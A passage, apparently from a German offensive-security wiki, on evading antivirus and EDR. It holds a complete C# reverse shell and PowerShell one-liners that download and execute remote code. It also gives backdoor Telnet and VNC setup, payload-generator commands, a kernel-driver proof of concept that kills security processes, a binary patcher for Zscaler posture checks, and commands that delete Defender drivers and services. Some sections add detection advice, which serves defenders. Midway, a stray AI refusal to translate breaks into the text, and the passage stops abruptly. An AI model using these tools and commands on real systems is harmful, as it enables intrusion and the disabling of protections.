virtualized-payload-execution.md
{{#endref}}

Umgehung ist ein sehr komplexes Thema. Manchmal musst du die vielen verschiedenen Telemetriequellen eines einzelnen Systems berücksichtigen, weshalb es in ausgereiften Umgebungen praktisch unmöglich ist, vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittenere Umgehungstechniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist ebenfalls ein großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Alte Techniken**

### **Prüfen, welche Teile Defender als bösartig erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile der Binärdatei**, bis es **herausfindet, welchen Teil Defender** als bösartig erkennt, und trennt diesen Teil für dich ab.\
Ein weiteres Tool, das **dasselbe macht, ist** [**avred**](https://github.com/dobin/avred). Der Dienst ist über ein offenes Webangebot unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) verfügbar.

### **Telnet-Server**

Bis Windows 10 enthielten alle Windows-Versionen einen **Telnet-Server**, den du als Administrator wie folgt installieren konntest:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sorgen Sie dafür, dass es beim Systemstart **startet**, und **führen** Sie es jetzt aus:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet-Port ändern (Stealth) und Firewall deaktivieren:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Lade es hier herunter: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du benötigst die Binärdateien, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege unter _VNC Password_ ein Passwort fest
- Lege unter _View-Only Password_ ein Passwort fest

Verschiebe dann die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **Opfer**

#### **Reverse connection**

Der **Angreifer** sollte auf seinem **Host** die Binärdatei `vncviewer.exe -listen 5900` ausführen, damit sie bereit ist, eine eingehende **VNC-Verbindung** entgegenzunehmen. Führe dann auf dem **Opfer** den winvnc-Daemon mit `winvnc.exe -run` aus und starte `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNUNG:** Um unauffällig zu bleiben, darfst du einige Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst wird ein [Popup](https://i.imgur.com/1SROTTl.png) ausgelöst. Prüfe mit `tasklist | findstr winvnc`, ob es läuft.
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst wird das [Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet.
- Führe nicht `winvnc -h` aus, um die Hilfe aufzurufen, sonst wird ein [Popup](https://i.imgur.com/oc18wcu.png) ausgelöst.

### GreatSCT

Lade es hier herunter: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

In GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Starte nun den **Listener** mit `msfconsole -r file.rc` und **führe** die **XML-Payload** aus mit:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Kompilieren unserer eigenen Reverse Shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C#-Reverse Shell

Kompiliere sie mit:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Verwende es mit:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# mit Compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C#-Obfuscatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python zum Erstellen von Injectors verwenden – Beispiel:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Space ausschalten

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um den Endpunktschutz zu deaktivieren, bevor die Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst AV-Dienste mit Protected-Process-Light (PPL) nicht blockieren können.<sup>[[12]](#references)</sup>

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf dem Datenträger abgelegte Datei heißt `ServiceMouse.sys`, doch die Binärdatei ist der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur besitzt, wird er auch bei aktiviertem Driver-Signature-Enforcement (DSE) geladen.
2. **Dienstinstallation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die erste Zeile registriert den Treiber als **Kernel-Dienst**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
   | IOCTL-Code | Fähigkeit                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Einen beliebigen Prozess anhand seiner PID beenden (wird verwendet, um Defender-/EDR-Dienste zu beenden) |
   | `0x990000D0` | Eine beliebige Datei auf dem Datenträger löschen |
   | `0x990001D0` | Den Treiber entladen und den Dienst entfernen |

   Minimaler C-Proof-of-Concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Warum es funktioniert**: BYOVD umgeht den Schutz im User-Mode vollständig; Code, der im Kernel ausgeführt wird, kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren – unabhängig von PPL/PP, ELAM oder anderen Härtungsfunktionen.

Erkennung / Gegenmaßnahmen
•  Aktivieren Sie Microsofts Sperrliste für anfällige Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
•  Überwachen Sie die Erstellung neuer *Kernel*-Dienste und lösen Sie einen Alarm aus, wenn ein Treiber aus einem für alle beschreibbaren Verzeichnis geladen wird oder nicht auf der Zulassungsliste steht.
•  Achten Sie auf Handles im User-Mode zu benutzerdefinierten Geräteobjekten, auf die verdächtige `DeviceIoControl`-Aufrufe folgen.

### Umgehung der Zscaler-Client-Connector-Posture-Prüfungen durch Patchen von Binärdateien auf der Festplatte

Zscaler’s **Client Connector** wendet Gerätestatus-Regeln lokal an und verwendet Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen eine vollständige Umgehung:

1. Die Gerätestatus-Prüfung erfolgt **vollständig clientseitig** (ein boolescher Wert wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob die verbindende ausführbare Datei **von Zscaler signiert** ist (über `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch **das Patchen von vier signierten Binärdateien auf der Festplatte** lassen sich beide Mechanismen neutralisieren:

| Binärdatei | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess (auch ein nicht signierter) kann sich mit den RPC-Pipes verbinden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Auszug eines minimalen Patchers:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nach dem Ersetzen der Originaldateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks zeigen **grün/konform** an.
* Nicht signierte oder modifizierte Binärdateien können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie sich rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Missbrauch vertrauenswürdiger Funktionalität von Microsoft Defender `BTR.sys`

Der **Boot-Time Removal**-Treiber von Defender ist ein nützliches Gegenbeispiel zu klassischem BYOVD. `BTR.sys` ist eine legitime, von Microsoft signierte Komponente zur Bereinigung, die weder eine Memory-Corruption-Schwachstelle noch eine IOCTL-Schnittstelle hat. Stattdessen kann ein Operator nach Erlangen von Administratorzugriff und `SeLoadDriverPrivilege` dessen private Bereinigungstransaktion fälschen und so die vorgesehenen Datei-/Registry-Operationen im Ring 0 ausführen. Dies ist ein **Primitive zur Neutralisierung von AV/EDR nach einer Kompromittierung, kein Initial Access oder Privilege Escalation**. Außerdem kann der Treiber aus der `BOOTTIMETOOL`-Ressource der `MpEngine.dll` des Ziels extrahiert werden, statt einen auffälligen Treiber eines Drittanbieters einzuschleusen.<sup>[[36]](#references)</sup>

### Bereitstellung des Einmal-Treibers

Defender legt die Ressource normalerweise als zufällig benannte Datei `[a-z]{8}.sys` ab und registriert einen ähnlich benannten Kernel-Service. `DriverEntry` liest den Wert `Args` des Service, öffnet den referenzierten NTFS-ADS, entschlüsselt und validiert die Aktionsliste, schreibt Feedback und gibt nach erfolgreicher Ausführung `0xC0000056` (`STATUS_DELETE_PENDING`) zurück, sodass der Treiber entladen wird, anstatt resident zu bleiben. Ein gefälschter Service weist die folgenden charakteristischen Werte auf.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Der `:changelist`-Stream enthält einen RC4-verschlüsselten Blob. Die analysierten Builds verwenden denselben festen 256-Byte-Schlüssel, daher ist die Verschlüsselung keine Autorisierungsgrenze. Ein gültiger Klartext besteht aus einem globalen 24-Byte-Header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, Header-CRC und einer aus der Payload abgeleiteten Transaktions-ID), gefolgt von einem nullterminierten UTF-16-Feedbackpfad und beliebig vielen Elementen. Jedes Element hat einen 16-Byte-Header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sowie aktionsspezifische Daten, die mit **genau vier NUL-Bytes** enden. Jeder Header- und Datenbereich wird unabhängig mit dem CRC-32-Polynom `0xEDB88320`, dem Anfangszustand `0xFFFFFFFF` und **ohne abschließendes XOR** (`~CRC32`) geprüft; der CRC-Zustand wird für jeden Bereich zurückgesetzt.<sup>[[36]](#references)[[37]](#references)</sup>

Die akzeptierten Aktions-IDs stellen diese Kernel-Primitiven bereit.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Elementdaten | Ergebnis |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Eine Datei löschen, auch wenn sie gesperrt ist |
| 2 | `[UTF-16 path]` | Ein leeres Verzeichnis entfernen |
| 3 | `[Flags][source][destination]` | Eine Datei in einen vom Angreifer ausgewählten geschützten Pfad verschieben; ein leeres Ziel bedeutet Löschen |
| 4 | `[Flags][key path]` | Einen Registry-Schlüssel rekursiv löschen |
| 5 | `[Flags][key path + "\\" + value]` | Einen Registry-Wert löschen |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Einen Registry-Wert erstellen/aktualisieren und fehlende Schlüsselpfade erstellen |

Bei den Aktionen 5 und 6 ist das Trennzeichen zwischen Schlüssel und Wert auf dem Übertragungsweg **zwei aufeinanderfolgende Backslashes**; ein konventionell formatierter Pfad wird nicht korrekt aufgeteilt. Die Feedbackdatei bildet die Anfrage größtenteils nach, aber die ersten vier Datenbytes jedes Elements werden zu dessen resultierendem `NTSTATUS`. Bei den Aktionen 1 und 2, die kein vorangestelltes Flags-Feld haben, verschiebt BTR den Pfad in die vier reservierten abschließenden Bytes, um Platz für diesen Status zu schaffen.<sup>[[36]](#references)</sup>

### `BTR_CLI`-Workflow und Zeitfenster beim frühen Systemstart

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementiert die vollständige Kette: `BTR.sys` aus dem lokalen Defender extrahieren, `<random>.sys:changelist` und einen Feedback-Stream erstellen, verkettete Aktionen serialisieren, mit Prüfsummen versehen und verschlüsseln, den Registry-Schlüssel des Dienstes direkt erstellen und anschließend `NtLoadDriver` für `-trigger now` aufrufen oder den Treiber mit `-trigger boot` als Systemstarttreiber belassen. Die direkte Registry-Vorbereitung umgeht den normalen SCM-Pfad über `CreateServiceW` und erzeugt daher **kein** Service-Install-Ereignis mit der ID 7045. Durch den Boot-Trigger ausgelöste Artefakte lassen sich später mit `BTR_CLI.exe -cleanup <service_name>` entfernen.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` ist nicht verwendbar, da BTR Datei-I/O aus `DriverEntry` ausführt, bevor der Speicher-Stack und der `SystemRoot`-Link bereit sind. `Start=1` in der hoch priorisierten Gruppe `Boot Bus Extender` führt stattdessen in Phase 1 zur Ausführung: NTFS ist verwendbar, aber viele Sicherheits-Treiber mit Systemstart und EDR-Dienste im Benutzermodus wurden noch nicht initialisiert. Boot-Start-Filter wie `WdFilter` sind möglicherweise bereits geladen, doch BTR kann ihre Binärdateien oder Dienstkonfiguration vor dem nächsten Start entfernen und ausführbare Dienstdateien löschen, bevor SCM sie startet. ELAM schließt diese Lücke nicht, da BTR nach der Boot-Start-Auswertung ausgeführt wird und eine gültige Microsoft-Signatur besitzt.<sup>[[36]](#references)</sup>

Mehrere Aktionen werden in einer Transaktion ausgeführt. Der PoC stellt Aktion 1 für die fest codierte `\SystemRoot\Temp\BootClean.log` voran: BTR erstellt diese Protokolldatei, führt dann seine eigene Löschanforderung aus und entfernt sie vor dem Entladen. Das verringert die Spuren. Werden Rückmeldedaten in `<random>.sys:<random>.dat` abgelegt, können der Treiber und beide Streams gemeinsam entfernt werden.<sup>[[36]](#references)[[37]](#references)</sup>

### Korrelationen für Erkennungen mit hoher Aussagekraft

Regeln, die nur auf Signaturen basieren, und die Microsoft-Sperrliste für verwundbare Treiber verhindern keinen Missbrauch der vorgesehenen BTR-Funktionalität. Bevorzugt diese Verhaltenskorrelationen und unterscheidet dabei eine legitime Defender-Prozessherkunft von einem beliebigen Launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die Erstellung von `.sys:changelist` tritt beim Staging von BTR immer auf. Ein `.dat`-ADS am selben `.sys` ist besonders verdächtig, da Defender Rückmeldedaten normalerweise unter `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` ablegt.
- **Sysmon 12/13 ohne System 7045:** Korreliert die direkte Erstellung von `HKLM\SYSTEM\CurrentControlSet\Services\<random>` mit `Args=...:changelist` und `Group=Boot Bus Extender`, wenn kein passendes SCM-Installationsereignis vorliegt.
- **Sysmon 6 -> 23:** Korreliert das Laden eines bekannten BTR-Treibers aus einer nicht zu Defender gehörenden Prozessherkunft mit anschließender, `System`/PID 4 zugeschriebener Dateilöschung, insbesondere bei Sicherheits-Binärdateien.
- **Sysmon 11 -> 23:** Löst einen Alarm aus, wenn `\SystemRoot\Temp\BootClean.log` schnell von `System`/PID 4 erstellt und gelöscht wird.
- Beschränkt und protokolliert die Zuweisung und Aktivierung von `SeLoadDriverPrivilege`; eine Microsoft-Signatur allein reicht nicht als Vertrauensnachweis, wenn der Treiber eines Sicherheitstools von `cmd.exe`, PowerShell oder einem unbekannten Prozess gestaged wird.

## Missbrauch von Protected Process Light (PPL), um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Signatur-/Ebenenhierarchie, sodass nur gleich oder höher geschützte Prozesse einander manipulieren können. Wenn du offensiv ein PPL-fähiges Binary legitim starten und dessen Argumente kontrollieren kannst, lässt sich gutartige Funktionalität (z. B. Protokollierung) in eine eingeschränkte, durch PPL abgesicherte Schreibprimitive für geschützte Verzeichnisse umwandeln, die von AV/EDR verwendet werden.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was einen Prozess als PPL ausführen lässt
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einer PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess und den Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss eine kompatible Schutzebene angefordert werden, die zur Signatur des Binaries passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signaturen, `PROTECTION_LEVEL_WINDOWS` für Windows-Signaturen). Falsche Ebenen führen dazu, dass die Erstellung fehlschlägt.

Siehe auch eine umfassendere Einführung in PP/PPL und den LSASS-Schutz:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt die Schutzebene aus und leitet Argumente an die Ziel-EXE weiter):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Verwendungsmuster:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Ich kann keine Anleitung übersetzen, die konkret beschreibt, wie sich AV-Schutz umgehen und Defender-Dateien vor dem Start beschädigen lassen. Ich kann stattdessen eine nicht-operative deutsche Zusammenfassung für defensive Analyse erstellen.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht steuern, sondern nur dessen Platzierung. Diese Primitive eignet sich daher eher für Beschädigungen als für die präzise Einschleusung von Inhalten.
- Zum Installieren/Starten eines Dienstes und für ein geeignetes Neustartfenster sind lokale Administratorrechte/SYSTEM erforderlich.
- Das Timing ist entscheidend: Das Ziel darf nicht geöffnet sein; die Ausführung beim Booten vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn der Prozess kurz nach dem Booten von nicht standardmäßigen Launchern gestartet wird.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binärdateien automatisch starten und durchgehend vor Defender/AV starten. Untersuche die Erstellung/Änderung von Diensten vor Ausfällen beim Start von Defender.
- Datei-Integritätsüberwachung für Defender-Binärdateien/Platform-Verzeichnisse; unerwartete Dateierstellungen/-änderungen durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und nach anomaler Nutzung von PPL-Leveln durch Nicht-AV-Binärdateien.

Gegenmaßnahmen
- WDAC/Code Integrity: Beschränke, welche signierten Binärdateien als PPL ausgeführt werden dürfen und unter welchen übergeordneten Prozessen; blockiere den Aufruf von ClipUp außerhalb legitimer Kontexte.
- Diensthygiene: Beschränke das Erstellen/Ändern automatisch startender Dienste und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass der Manipulationsschutz von Defender und der Early-Launch-Schutz aktiviert sind; untersuche Startfehler, die auf eine Beschädigung von Binärdateien hindeuten.
- Ziehe in Betracht, die Generierung von 8.3-Kurznamen auf Volumes zu deaktivieren, auf denen Sicherheitstools liegen, sofern dies mit deiner Umgebung kompatibel ist (gründlich testen).

## Manipulation von Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wählt die Plattform, von der es ausgeführt wird, indem es die Unterordner unter folgendem Pfad auflistet:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit der lexikografisch höchsten Versionszeichenfolge aus (z. B. `4.18.25070.5-0`) und startet anschließend die Defender-Dienstprozesse von dort (wobei Dienst-/Registrierungspfade entsprechend aktualisiert werden). Bei dieser Auswahl vertraut es Verzeichniseinträgen, einschließlich Verzeichnis-Reparse-Points (Symlinks). Ein Administrator kann dies ausnutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL Sideloading oder eine Dienstunterbrechung zu erreichen.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokale Administratorrechte (erforderlich, um Verzeichnisse/Symlinks im Platform-Ordner zu erstellen)
- Möglichkeit, einen Neustart durchzuführen oder eine erneute Auswahl der Defender-Plattform auszulösen (Dienstneustart beim Booten)
- Es sind nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
- Defender blockiert Schreibzugriffe in seinen eigenen Ordnern, aber bei der Auswahl der Plattform vertraut es Verzeichniseinträgen und wählt die lexikografisch höchste Version aus, ohne zu überprüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad verweist.

Schritt für Schritt (Beispiel)
1) Erstelle einen beschreibbaren Klon des aktuellen Plattformordners, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnis-Symlink mit einer höheren Versionsnummer, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Auswahl des Triggers (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen, ob MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Sie sollten den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Dienstkonfiguration/Registry beobachten, die diesen Speicherort widerspiegeln.

Post-Exploitation-Optionen
